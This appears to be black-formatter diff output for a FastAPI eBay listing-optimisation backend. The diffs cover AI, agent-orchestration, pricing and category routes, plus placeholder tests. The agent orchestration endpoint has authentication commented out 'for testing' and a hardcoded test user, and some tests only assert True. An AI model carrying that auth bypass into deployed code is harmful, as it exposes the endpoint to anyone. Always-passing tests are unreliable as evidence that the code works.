+        )
+
     except Exception as e:
         logger.error(f"Error in listing generation: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Listing generation failed: {str(e)}"
+            detail=f"Listing generation failed: {str(e)}",
         )
 
 
 @router.post("/optimize-category")
 async def optimize_product_category(
     request: CategoryOptimizationRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Optimize product category selection for better marketplace performance.
-    
+
     This endpoint:
     - Analyzes current category placement
     - Suggests optimal categories
     - Provides performance predictions
     - Offers marketplace-specific recommendations
@@ -212,39 +236,39 @@
         # Use content agent for category optimization
         optimization_result = await content_agent.optimize_category_placement(
             product_name=request.product_name,
             current_category=request.current_category,
             marketplace=request.marketplace,
-            product_attributes=request.product_attributes or {}
-        )
-        
+            product_attributes=request.product_attributes or {},
+        )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "optimization_result": optimization_result,
-                "optimized_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "optimized_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error in category optimization: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Category optimization failed: {str(e)}"
+            detail=f"Category optimization failed: {str(e)}",
         )
 
 
 @router.get("/analysis/history")
 async def get_analysis_history(
     limit: int = 10,
     offset: int = 0,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get user's analysis history.
-    
+
     This endpoint returns:
     - Recent analysis results
     - Performance metrics
     - Usage statistics
     """
@@ -255,28 +279,28 @@
             "analyses": [],
             "total_count": 0,
             "usage_stats": {
                 "total_analyses": 0,
                 "this_month": 0,
-                "average_confidence": 0.0
-            }
+                "average_confidence": 0.0,
+            },
         }
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "history": history,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving analysis history: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve history: {str(e)}"
+            detail=f"Failed to retrieve history: {str(e)}",
         )
 
 
 @router.get("/models/status")
 async def get_ai_models_status():
@@ -292,52 +316,57 @@
     try:
         # Get performance report from enhanced vision manager
         performance_report = enhanced_vision_manager.get_performance_report()
 
         # Get service metrics
-        local_metrics = enhanced_vision_manager.router.get_service_metrics(VisionServiceType.LOCAL_LLAVA)
-        cloud_metrics = enhanced_vision_manager.router.get_service_metrics(VisionServiceType.CLOUD_GPT4)
+        local_metrics = enhanced_vision_manager.router.get_service_metrics(
+            VisionServiceType.LOCAL_LLAVA
+        )
+        cloud_metrics = enhanced_vision_manager.router.get_service_metrics(
+            VisionServiceType.CLOUD_GPT4
+        )
 
         status_info = {
             "enhanced_routing": {
                 "enabled": True,
                 "performance_report": performance_report,
-                "cost_optimization": True
+                "cost_optimization": True,
             },
             "local_models": {
                 "llava:7b": {
                     "available": True,
                     "cost": local_metrics["cost"],
                     "performance": local_metrics["performance"],
-                    "recommended_for": local_metrics["recommended_for"]
+                    "recommended_for": local_metrics["recommended_for"],
                 }
             },
             "cloud_models": {
                 "gpt-4-vision": {
-                    "available": enhanced_vision_manager._get_cloud_client() is not None,
+                    "available": enhanced_vision_manager._get_cloud_client()
+                    is not None,
                     "cost": cloud_metrics["cost"],
                     "performance": cloud_metrics["performance"],
-                    "recommended_for": cloud_metrics["recommended_for"]
+                    "recommended_for": cloud_metrics["recommended_for"],
                 }
             },
-            "routing_strategy": "intelligent_cost_optimization"
+            "routing_strategy": "intelligent_cost_optimization",
         }
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "models": status_info,
-                "checked_at": datetime.now(timezone.utc).isoformat()
-            }
+                "checked_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error checking model status: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to check model status: {str(e)}"
+            detail=f"Failed to check model status: {str(e)}",
         )
 
 
 @router.get("/vision/performance")
 async def get_vision_performance_metrics():
@@ -356,27 +385,29 @@
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "performance_metrics": performance_report,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error retrieving performance metrics: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve metrics: {str(e)}"
+            detail=f"Failed to retrieve metrics: {str(e)}",
         )
 
 
 # Agent Coordination Endpoints
 @router.post("/coordination/orchestrate")
 async def orchestrate_agents(
     workflow_type: str = Form(..., description="Type of workflow to execute"),
-    participating_agents: str = Form(..., description="Comma-separated list of agent types"),
+    participating_agents: str = Form(
+        ..., description="Comma-separated list of agent types"
+    ),
     context: str = Form(..., description="JSON string of workflow context"),
     # Temporarily disable auth for testing - current_user: User = Depends(AuthService.get_current_user)
 ):
     """
     Orchestrate multiple agents in a coordinated workflow.
@@ -401,27 +432,27 @@
         # Execute orchestration
         result = await orchestration_service.coordinate_agents(
             workflow_type=workflow_type,
             participating_agents=agent_list,
             context=context_data,
-            user_id="test_user"
+            user_id="test_user",
         )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "orchestration_result": result,
-                "initiated_at": datetime.now(timezone.utc).isoformat()
-            }
+                "initiated_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error in agent orchestration: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Orchestration failed: {str(e)}"
+            detail=f"Orchestration failed: {str(e)}",
         )
 
 
 @router.get("/communication/status")
 async def get_agent_communication_status(
@@ -454,11 +485,11 @@
         # Get agent registry status
         agent_status = {
             agent_name: {
                 "available": True,
                 "type": type(agent).__name__,
-                "capabilities": getattr(agent, 'capabilities', [])
+                "capabilities": getattr(agent, "capabilities", []),
             }
             for agent_name, agent in orchestration_service.agent_registry.items()
         }
 
         return JSONResponse(
@@ -468,40 +499,46 @@
                 "communication_status": {
                     "active_workflows": active_workflows,
                     "active_handoffs": active_handoffs,
                     "agent_status": agent_status,
                     "total_active_workflows": len(active_workflows),
-                    "total_active_handoffs": len(active_handoffs)
+                    "total_active_handoffs": len(active_handoffs),
                 },
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error getting communication status: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to get status: {str(e)}"
+            detail=f"Failed to get status: {str(e)}",
         )
 
 
 # ============================================================================
 # AI FEATURE 5: LISTING PERFORMANCE PREDICTION
 # ============================================================================
 
+
 class PerformancePredictionRequest(BaseModel):
     """Request model for listing performance prediction."""
+
     product_data: Dict[str, Any] = Field(..., description="Product information")
-    listing_data: Dict[str, Any] = Field(..., description="Listing content and metadata")
+    listing_data: Dict[str, Any] = Field(
+        ..., description="Listing content and metadata"
+    )
     marketplace: str = Field(default="ebay", description="Target marketplace")
-    historical_context: Optional[Dict[str, Any]] = Field(None, description="Historical performance data")
+    historical_context: Optional[Dict[str, Any]] = Field(
+        None, description="Historical performance data"
+    )
 
 
 @router.post("/predict-performance")
 async def predict_listing_performance(
     request: PerformancePredictionRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Predict listing performance and success probability.
 
     This endpoint:
@@ -509,55 +546,63 @@
     - Predicts sale time and success probability
     - Provides optimization recommendations
     - Generates performance scoring
     """
     try:
-        from fs_agt_clean.services.analytics.performance_predictor import performance_predictor_service
+        from fs_agt_clean.services.analytics.performance_predictor import (
+            performance_predictor_service,
+        )
 
         logger.info(f"Predicting performance for user {current_user.id}")
 
         # Generate performance prediction
         prediction_result = await performance_predictor_service.predict_listing_success(
             product_data=request.product_data,
             listing_data=request.listing_data,
             marketplace=request.marketplace,
-            historical_context=request.historical_context or {}
+            historical_context=request.historical_context or {},
         )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "prediction": prediction_result,
-                "predicted_at": datetime.now(timezone.utc).isoformat()
-            }
+                "predicted_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error in performance prediction: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Performance prediction failed: {str(e)}"
+            detail=f"Performance prediction failed: {str(e)}",
         )
 
 
 # ============================================================================
 # AI FEATURE 6: CONVERSATIONAL LISTING OPTIMIZATION
 # ============================================================================
 
+
 class ConversationalOptimizationRequest(BaseModel):
     """Request model for conversational listing optimization."""
+
     user_message: str = Field(..., description="User's natural language request")
     current_listing: Dict[str, Any] = Field(..., description="Current listing content")
-    conversation_context: Optional[List[Dict[str, Any]]] = Field(None, description="Previous conversation")
-    optimization_focus: Optional[str] = Field("general", description="Optimization focus area")
+    conversation_context: Optional[List[Dict[str, Any]]] = Field(
+        None, description="Previous conversation"
+    )
+    optimization_focus: Optional[str] = Field(
+        "general", description="Optimization focus area"
+    )
 
 
 @router.post("/conversational-optimize")
 async def conversational_listing_optimization(
     request: ConversationalOptimizationRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Provide conversational listing optimization and adjustments.
 
     This endpoint:
@@ -565,46 +610,52 @@
     - Makes real-time content adjustments
     - Provides suggestion explanations
     - Enables interactive optimization
     """
     try:
-        from fs_agt_clean.services.conversational.optimization_service import conversational_optimization_service
-
-        logger.info(f"Processing conversational optimization for user {current_user.id}")
+        from fs_agt_clean.services.conversational.optimization_service import (
+            conversational_optimization_service,
+        )
+
+        logger.info(
+            f"Processing conversational optimization for user {current_user.id}"
+        )
 
         # Process conversational optimization request
-        optimization_result = await conversational_optimization_service.process_optimization_request(
-            user_message=request.user_message,
-            current_listing=request.current_listing,
-            conversation_context=request.conversation_context or [],
-            optimization_focus=request.optimization_focus,
-            user_id=str(current_user.id)
+        optimization_result = (
+            await conversational_optimization_service.process_optimization_request(
+                user_message=request.user_message,
+                current_listing=request.current_listing,
+                conversation_context=request.conversation_context or [],
+                optimization_focus=request.optimization_focus,
+                user_id=str(current_user.id),
+            )
         )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "optimization": optimization_result,
-                "processed_at": datetime.now(timezone.utc).isoformat()
-            }
+                "processed_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error in conversational optimization: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Conversational optimization failed: {str(e)}"
+            detail=f"Conversational optimization failed: {str(e)}",
         )
 
 
 @router.post("/decision/consensus")
 async def create_decision_consensus(
     decision_context: Dict[str, Any],
     participating_agents: List[str],
     consensus_threshold: float = 0.7,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Create a consensus decision among multiple agents.
 
     This endpoint:
@@ -618,37 +669,37 @@
 
         # Execute consensus process
         consensus_result = await orchestration_service.handle_consensus(
             decision_context=decision_context,
             participating_agents=participating_agents,
-            consensus_threshold=consensus_threshold
+            consensus_threshold=consensus_threshold,
         )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "consensus_result": consensus_result,
-                "processed_at": datetime.now(timezone.utc).isoformat()
-            }
+                "processed_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error in decision consensus: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Consensus failed: {str(e)}"
+            detail=f"Consensus failed: {str(e)}",
         )
 
 
 @router.get("/handoff/{agent_type}")
 async def initiate_agent_handoff(
     agent_type: str,
     from_agent: str = Query(..., description="Source agent type"),
     conversation_id: Optional[str] = Query(None, description="Conversation ID"),
     context: str = Query("{}", description="JSON context for handoff"),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Initiate a handoff from one agent to another.
 
     This endpoint:
@@ -668,23 +719,23 @@
         handoff_result = await orchestration_service.initiate_agent_handoff(
             from_agent_type=from_agent,
             to_agent_type=agent_type,
             context=context_data,
             conversation_id=conversation_id,
-            user_id=str(current_user.id)
+            user_id=str(current_user.id),
         )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "handoff_result": handoff_result,
-                "initiated_at": datetime.now(timezone.utc).isoformat()
-            }
+                "initiated_at": datetime.now(timezone.utc).isoformat(),
+            },
         )
 
     except Exception as e:
         logger.error(f"Error in agent handoff: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Handoff failed: {str(e)}"
-        )
+            detail=f"Handoff failed: {str(e)}",
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_routes.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/ebay_routes.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/ebay_routes.py	2025-06-19 04:03:44.769003+00:00
@@ -17,37 +17,50 @@
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
-from fs_agt_clean.services.marketplace.ebay_optimization import ebay_optimization_service
-from fs_agt_clean.services.marketplace.ebay_pricing import ebay_pricing_service, PricingStrategy, ListingFormat
+from fs_agt_clean.services.marketplace.ebay_optimization import (
+    ebay_optimization_service,
+)
+from fs_agt_clean.services.marketplace.ebay_pricing import (
+    ebay_pricing_service,
+    PricingStrategy,
+    ListingFormat,
+)
 
 logger = logging.getLogger(__name__)
 
 # Initialize router
 router = APIRouter(prefix="/marketplace/ebay", tags=["ebay-marketplace"])
 
 
 class EbayCategoryOptimizationRequest(BaseModel):
     """Request model for eBay category optimization."""
+
     product_name: str = Field(..., description="Product name")
     current_category: str = Field(..., description="Current category")
-    product_attributes: Dict[str, Any] = Field(default_factory=dict, description="Product attributes")
+    product_attributes: Dict[str, Any] = Field(
+        default_factory=dict, description="Product attributes"
+    )
 
 
 class EbayPricingAnalysisRequest(BaseModel):
     """Request model for eBay pricing analysis."""
+
     product_name: str = Field(..., description="Product name")
     product_category: str = Field(..., description="Product category")
     product_condition: str = Field(..., description="Product condition")
     base_price: float = Field(..., gt=0, description="Base price for analysis")
-    product_attributes: Optional[Dict[str, Any]] = Field(default=None, description="Additional product attributes")
+    product_attributes: Optional[Dict[str, Any]] = Field(
+        default=None, description="Additional product attributes"
+    )
 
 
 class EbayCategoryOptimizationResponse(BaseModel):
     """Response model for eBay category optimization."""
+
     user_id: str
     product_name: str
     original_category: str
     recommended_category: str
     category_id: str
@@ -57,10 +70,11 @@
     optimization_details: Dict[str, Any]
 
 
 class EbayPricingAnalysisResponse(BaseModel):
     """Response model for eBay pricing analysis."""
+
     product_name: str
     recommended_price: float
     strategy: str
     listing_format: str
     confidence: float
@@ -69,152 +83,158 @@
 
 
 @router.post("/category/optimize", response_model=EbayCategoryOptimizationResponse)
 async def optimize_ebay_category(
     request: EbayCategoryOptimizationRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Optimize product category specifically for eBay marketplace.
-    
+
     This endpoint:
     - Analyzes product fit for eBay categories
     - Provides eBay-specific category recommendations
     - Calculates performance improvement predictions
     - Includes fee analysis and optimization tips
     """
     try:
-        logger.info(f"Optimizing eBay category for user {current_user.id}: {request.product_name}")
-        
+        logger.info(
+            f"Optimizing eBay category for user {current_user.id}: {request.product_name}"
+        )
+
         # Perform eBay category optimization
-        optimization_result = await ebay_optimization_service.optimize_category_for_ebay(
-            product_name=request.product_name,
-            current_category=request.current_category,
-            product_attributes=request.product_attributes,
-            user_id=str(current_user.id)
-        )
-        
+        optimization_result = (
+            await ebay_optimization_service.optimize_category_for_ebay(
+                product_name=request.product_name,
+                current_category=request.current_category,
+                product_attributes=request.product_attributes,
+                user_id=str(current_user.id),
+            )
+        )
+
         # Check for errors
         if "error" in optimization_result:
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-                detail=optimization_result["message"]
+                detail=optimization_result["message"],
             )
-        
+
         return EbayCategoryOptimizationResponse(**optimization_result)
-        
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error in eBay category optimization: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Category optimization failed: {str(e)}"
+            detail=f"Category optimization failed: {str(e)}",
         )
 
 
 @router.post("/pricing/analyze", response_model=EbayPricingAnalysisResponse)
 async def analyze_ebay_pricing(
     request: EbayPricingAnalysisRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Analyze pricing strategy for eBay marketplace.
-    
+
     This endpoint:
     - Analyzes competitive landscape on eBay
     - Provides pricing strategy recommendations
     - Calculates fee impact and net proceeds
     - Suggests optimal listing format
     """
     try:
-        logger.info(f"Analyzing eBay pricing for user {current_user.id}: {request.product_name}")
-        
+        logger.info(
+            f"Analyzing eBay pricing for user {current_user.id}: {request.product_name}"
+        )
+
         # Convert base price to Decimal for precise calculations
         base_price = Decimal(str(request.base_price))
-        
+
         # Perform pricing analysis
         pricing_analysis = await ebay_pricing_service.analyze_pricing_strategy(
             product_name=request.product_name,
             product_category=request.product_category,
             product_condition=request.product_condition,
             base_price=base_price,
-            product_attributes=request.product_attributes
-        )
-        
+            product_attributes=request.product_attributes,
+        )
+
         return EbayPricingAnalysisResponse(
             product_name=pricing_analysis.product_name,
             recommended_price=float(pricing_analysis.recommended_price),
             strategy=pricing_analysis.strategy.value,
             listing_format=pricing_analysis.listing_format.value,
             confidence=pricing_analysis.confidence,
             market_data=pricing_analysis.market_data,
-            fee_analysis=pricing_analysis.fee_analysis
-        )
-        
+            fee_analysis=pricing_analysis.fee_analysis,
+        )
+
     except Exception as e:
         logger.error(f"Error in eBay pricing analysis: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Pricing analysis failed: {str(e)}"
+            detail=f"Pricing analysis failed: {str(e)}",
         )
 
 
 @router.get("/categories/mapping")
 async def get_ebay_category_mapping(
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get eBay category mapping information.
-    
+
     This endpoint returns:
     - Available eBay categories
     - Category hierarchy and relationships
     - Fee structure by category
     - Category-specific requirements
     """
     try:
         # Get category mapping from optimization service
         category_mapping = ebay_optimization_service.category_mapping
-        
+
         # Format for API response
         categories = {}
         for key, category in category_mapping.items():
             categories[key] = {
                 "category_id": category.category_id,
                 "category_name": category.category_name,
                 "parent_id": category.parent_id,
                 "level": category.level,
                 "fees": category.fees,
-                "requirements": category.requirements
+                "requirements": category.requirements,
             }
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "categories": categories,
                 "total_categories": len(categories),
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving eBay category mapping: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve category mapping: {str(e)}"
+            detail=f"Failed to retrieve category mapping: {str(e)}",
         )
 
 
 @router.get("/pricing/strategies")
 async def get_pricing_strategies(
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get available eBay pricing strategies.
-    
+
     This endpoint returns:
     - Available pricing strategies
     - Strategy descriptions and use cases
     - Listing format options
     - Fee structure information
@@ -223,60 +243,64 @@
         strategies = {
             strategy.value: {
                 "name": strategy.value.replace("_", " ").title(),
                 "description": _get_strategy_description(strategy),
                 "use_cases": _get_strategy_use_cases(strategy),
-                "recommended_for": _get_strategy_recommendations(strategy)
+                "recommended_for": _get_strategy_recommendations(strategy),
             }
             for strategy in PricingStrategy
         }
-        
+
         listing_formats = {
             format_type.value: {
                 "name": format_type.value.replace("_", " ").title(),
                 "description": _get_format_description(format_type),
                 "pros": _get_format_pros(format_type),
-                "cons": _get_format_cons(format_type)
+                "cons": _get_format_cons(format_type),
             }
             for format_type in ListingFormat
         }
-        
+
         fee_structure = ebay_pricing_service.fee_structure
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "pricing_strategies": strategies,
                 "listing_formats": listing_formats,
                 "fee_structure": {
                     "insertion_fee": float(fee_structure["insertion_fee"]),
-                    "final_value_fee_rate": float(fee_structure["final_value_fee_rate"]),
+                    "final_value_fee_rate": float(
+                        fee_structure["final_value_fee_rate"]
+                    ),
                     "final_value_fee_max": float(fee_structure["final_value_fee_max"]),
-                    "store_subscription_discount": float(fee_structure["store_subscription_discount"])
+                    "store_subscription_discount": float(
+                        fee_structure["store_subscription_discount"]
+                    ),
                 },
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving pricing strategies: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve pricing strategies: {str(e)}"
+            detail=f"Failed to retrieve pricing strategies: {str(e)}",
         )
 
 
 @router.get("/optimization/history")
 async def get_optimization_history(
     limit: int = 10,
     offset: int = 0,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get user's eBay optimization history.
-    
+
     This endpoint returns:
     - Recent category optimizations
     - Pricing analysis history
     - Performance improvements
     - Success metrics
@@ -287,32 +311,28 @@
         history = {
             "category_optimizations": [],
             "pricing_analyses": [],
             "total_optimizations": 0,
             "average_improvement": 0.0,
-            "success_rate": 0.0
+            "success_rate": 0.0,
         }
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "optimization_history": history,
-                "pagination": {
-                    "limit": limit,
-                    "offset": offset,
-                    "total": 0
-                },
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "pagination": {"limit": limit, "offset": offset, "total": 0},
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving optimization history: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve optimization history: {str(e)}"
+            detail=f"Failed to retrieve optimization history: {str(e)}",
         )
 
 
 def _get_strategy_description(strategy: PricingStrategy) -> str:
     """Get description for pricing strategy."""
@@ -320,64 +340,122 @@
         PricingStrategy.COMPETITIVE: "Price competitively with market average",
         PricingStrategy.PREMIUM: "Price above market for premium positioning",
         PricingStrategy.AGGRESSIVE: "Price below market for quick sales",
         PricingStrategy.AUCTION_STYLE: "Use auction format for price discovery",
         PricingStrategy.BUY_IT_NOW: "Fixed price with immediate purchase option",
-        PricingStrategy.BEST_OFFER: "Allow buyers to make offers"
+        PricingStrategy.BEST_OFFER: "Allow buyers to make offers",
     }
     return descriptions.get(strategy, "Strategy description not available")
 
 
 def _get_strategy_use_cases(strategy: PricingStrategy) -> List[str]:
     """Get use cases for pricing strategy."""
     use_cases = {
         PricingStrategy.COMPETITIVE: ["Standard products", "High competition markets"],
-        PricingStrategy.PREMIUM: ["Unique items", "High-quality products", "Low competition"],
+        PricingStrategy.PREMIUM: [
+            "Unique items",
+            "High-quality products",
+            "Low competition",
+        ],
         PricingStrategy.AGGRESSIVE: ["Quick liquidation", "High inventory turnover"],
-        PricingStrategy.AUCTION_STYLE: ["Rare items", "Price uncertainty", "Collectibles"],
-        PricingStrategy.BUY_IT_NOW: ["New products", "Standard pricing", "Business sales"],
-        PricingStrategy.BEST_OFFER: ["Negotiable items", "Used products", "Flexible pricing"]
+        PricingStrategy.AUCTION_STYLE: [
+            "Rare items",
+            "Price uncertainty",
+            "Collectibles",
+        ],
+        PricingStrategy.BUY_IT_NOW: [
+            "New products",
+            "Standard pricing",
+            "Business sales",
+        ],
+        PricingStrategy.BEST_OFFER: [
+            "Negotiable items",
+            "Used products",
+            "Flexible pricing",
+        ],
     }
     return use_cases.get(strategy, [])
 
 
 def _get_strategy_recommendations(strategy: PricingStrategy) -> List[str]:
     """Get recommendations for pricing strategy."""
     recommendations = {
-        PricingStrategy.COMPETITIVE: ["Monitor competitor prices", "Adjust based on market changes"],
-        PricingStrategy.PREMIUM: ["Highlight unique features", "Use high-quality photos"],
-        PricingStrategy.AGGRESSIVE: ["Ensure profit margins", "Monitor inventory levels"],
-        PricingStrategy.AUCTION_STYLE: ["Set reasonable starting price", "Use reserve if needed"],
-        PricingStrategy.BUY_IT_NOW: ["Research market prices", "Consider shipping costs"],
-        PricingStrategy.BEST_OFFER: ["Set auto-accept/decline thresholds", "Respond quickly to offers"]
+        PricingStrategy.COMPETITIVE: [
+            "Monitor competitor prices",
+            "Adjust based on market changes",
+        ],
+        PricingStrategy.PREMIUM: [
+            "Highlight unique features",
+            "Use high-quality photos",
+        ],
+        PricingStrategy.AGGRESSIVE: [
+            "Ensure profit margins",
+            "Monitor inventory levels",
+        ],
+        PricingStrategy.AUCTION_STYLE: [
+            "Set reasonable starting price",
+            "Use reserve if needed",
+        ],
+        PricingStrategy.BUY_IT_NOW: [
+            "Research market prices",
+            "Consider shipping costs",
+        ],
+        PricingStrategy.BEST_OFFER: [
+            "Set auto-accept/decline thresholds",
+            "Respond quickly to offers",
+        ],
     }
     return recommendations.get(strategy, [])
 
 
 def _get_format_description(format_type: ListingFormat) -> str:
     """Get description for listing format."""
     descriptions = {
         ListingFormat.AUCTION: "Bidding-based format with time limit",
         ListingFormat.BUY_IT_NOW: "Fixed price with immediate purchase",
-        ListingFormat.CLASSIFIED: "Local pickup and contact-based sales"
+        ListingFormat.CLASSIFIED: "Local pickup and contact-based sales",
     }
     return descriptions.get(format_type, "Format description not available")
 
 
 def _get_format_pros(format_type: ListingFormat) -> List[str]:
     """Get pros for listing format."""
     pros = {
-        ListingFormat.AUCTION: ["Price discovery", "Competitive bidding", "Potential for higher prices"],
-        ListingFormat.BUY_IT_NOW: ["Immediate sales", "Predictable pricing", "Professional appearance"],
-        ListingFormat.CLASSIFIED: ["Local sales", "No shipping", "Personal interaction"]
+        ListingFormat.AUCTION: [
+            "Price discovery",
+            "Competitive bidding",
+            "Potential for higher prices",
+        ],
+        ListingFormat.BUY_IT_NOW: [
+            "Immediate sales",
+            "Predictable pricing",
+            "Professional appearance",
+        ],
+        ListingFormat.CLASSIFIED: [
+            "Local sales",
+            "No shipping",
+            "Personal interaction",
+        ],
     }
     return pros.get(format_type, [])
 
 
 def _get_format_cons(format_type: ListingFormat) -> List[str]:
     """Get cons for listing format."""
     cons = {
-        ListingFormat.AUCTION: ["Uncertain final price", "Time commitment", "Potential for low prices"],
-        ListingFormat.BUY_IT_NOW: ["Fixed pricing", "Less excitement", "Market research required"],
-        ListingFormat.CLASSIFIED: ["Limited audience", "Local only", "More complex transactions"]
+        ListingFormat.AUCTION: [
+            "Uncertain final price",
+            "Time commitment",
+            "Potential for low prices",
+        ],
+        ListingFormat.BUY_IT_NOW: [
+            "Fixed pricing",
+            "Less excitement",
+            "Market research required",
+        ],
+        ListingFormat.CLASSIFIED: [
+            "Limited audience",
+            "Local only",
+            "More complex transactions",
+        ],
     }
     return cons.get(format_type, [])
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_auth.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_auth.py	2025-06-19 04:03:44.761249+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from auth import *
+
 
 class TestAuthAPIServices:
     """API/Services test class for auth."""
 
     def test_import(self):
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/ebay_routes.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_auth.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_inventory.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_inventory.py	2025-06-19 04:03:44.791953+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for inventory_endpoints
 
